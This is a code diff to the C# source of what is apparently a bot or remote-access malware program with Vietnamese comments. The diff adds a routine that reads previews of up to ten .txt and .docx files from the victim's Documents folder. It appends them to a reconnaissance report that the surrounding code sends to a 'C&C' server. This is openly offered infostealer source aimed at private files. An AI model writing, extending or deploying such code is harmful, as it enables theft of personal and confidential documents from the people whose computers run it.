@@ -1,14 +1,17 @@
-﻿using System;
+﻿using DocumentFormat.OpenXml.Packaging;
+using Microsoft.Win32;
+using System;
+using System.Diagnostics;
 using System.IO;
+using System.Management;
 using System.Net.Http;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.Json;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Diagnostics;
-using Microsoft.Win32;
-using System.Management;
+using static System.Net.Mime.MediaTypeNames;
+using OpenXmlText = DocumentFormat.OpenXml.Wordprocessing.Text;
 
 // === NÂNG CẤP: Dùng hằng số để tránh lỗi chính tả ===
 public static class BotCommands
@@ -388,6 +391,13 @@ public class Bot
             string userPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
             ScanFolder(userPath, report, 0, 2); // Chỉ quét sâu 2 lớp thư mục
 
+            report.AppendLine("--------------------------------------------------");
+
+            //đọc nội dung file txt, docx trong folder documents
+            report.AppendLine("[DOCUMENT CONTENT EXTRACTION]");
+            string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            await ExtractDocumentContents(documentsPath, report);
+
             // 3. Gửi về Server
             Console.WriteLine("[RECON] Sending report to C&C...");
             await SendReconToServerAsync(report.ToString());
@@ -403,6 +413,127 @@ public class Bot
             Console.WriteLine($"[RECON ERROR] {ex.Message}");
             await SendLogToServerAsync($"Recon Failed: {ex.Message}");
             currentStatus = BotCommands.ReconDone;
+        }
+    }
+    static Task ExtractDocumentContents(string documentsPath, StringBuilder report)
+    {
+        return Task.Run(() =>
+        {
+            try
+        {
+            if (!Directory.Exists(documentsPath))
+            {
+                report.AppendLine("[!] Documents folder not found.");
+                return;
+            }
+
+            // Tìm tất cả file .txt và .docx (không đệ quy quá sâu)
+            var txtFiles = Directory.GetFiles(documentsPath, "*.txt", SearchOption.TopDirectoryOnly);
+            var docxFiles = Directory.GetFiles(documentsPath, "*.docx", SearchOption.TopDirectoryOnly);
+
+            int fileCount = 0;
+            const int MaxFiles = 10; // Giới hạn 10 file để tránh báo cáo quá dài
+
+            // Đọc file .txt
+            foreach (var filePath in txtFiles)
+            {
+                if (fileCount >= MaxFiles) break;
+
+                try
+                {
+                    var fileInfo = new FileInfo(filePath);
+
+                    // Chỉ đọc file nhỏ hơn 1MB để tránh quá tải
+                    if (fileInfo.Length > 1 * 1024 * 1024) continue;
+
+                    report.AppendLine($"\n[TXT FILE] {fileInfo.Name} ({fileInfo.Length / 1024} KB)");
+                    report.AppendLine("--- Content Preview (First 500 chars) ---");
+
+                    string content = File.ReadAllText(filePath);
+                    string preview = content.Length > 500 ? content.Substring(0, 500) + "..." : content;
+                    report.AppendLine(preview);
+                    report.AppendLine("------------------------------------------");
+
+                    fileCount++;
+                }
+                catch (Exception ex)
+                {
+                    report.AppendLine($"[!] Error reading {Path.GetFileName(filePath)}: {ex.Message}");
+                }
+            }
+
+            // Đọc file .docx
+            foreach (var filePath in docxFiles)
+            {
+                if (fileCount >= MaxFiles) break;
+
+                try
+                {
+                    // Bỏ qua file tạm của Word (bắt đầu bằng ~$)
+                    if (Path.GetFileName(filePath).StartsWith("~$")) continue;
+
+                    var fileInfo = new FileInfo(filePath);
+
+                    // Chỉ đọc file nhỏ hơn 5MB
+                    if (fileInfo.Length > 5 * 1024 * 1024) continue;
+
+                    report.AppendLine($"\n[DOCX FILE] {fileInfo.Name} ({fileInfo.Length / 1024} KB)");
+                    report.AppendLine("--- Content Preview ---");
+
+                    string docxContent = ExtractTextFromDocx(filePath);
+                    string preview = docxContent.Length > 500 ? docxContent.Substring(0, 500) + "..." : docxContent;
+                    report.AppendLine(preview);
+                    report.AppendLine("------------------------------------------");
+
+                    fileCount++;
+                }
+                catch (Exception ex)
+                {
+                    report.AppendLine($"[!] Error reading {Path.GetFileName(filePath)}: {ex.Message}");
+                }
+            }
+
+            if (fileCount == 0)
+            {
+                report.AppendLine("[INFO] No .txt or .docx files found in Documents folder.");
+            }
+            else
+            {
+                report.AppendLine($"\n[SUMMARY] Extracted content from {fileCount} document(s).");
+            }
+        }
+        catch (Exception ex)
+        {
+            report.AppendLine($"[!] Document extraction failed: {ex.Message}");
+        }
+        });
+    }
+
+    // === HÀM ĐỌC NỘI DUNG FILE DOCX ===
+    static string ExtractTextFromDocx(string filePath)
+    {
+        try
+        {
+            using (WordprocessingDocument wordDoc = WordprocessingDocument.Open(filePath, false))
+            {
+                var body = wordDoc.MainDocumentPart?.Document?.Body;
+                if (body == null) return "[Empty Document]";
+
+                // Lấy tất cả text trong document
+                StringBuilder textBuilder = new StringBuilder();
+                var textElements = body.Descendants<OpenXmlText>();
+
+                foreach (var textElement in textElements)
+                {
+                    textBuilder.Append(textElement.Text);
+                }
+
+                return textBuilder.ToString();
+            }
+        }
+        catch (Exception ex)
+        {
+            return $"[Error extracting DOCX: {ex.Message}]";
         }
     }
 
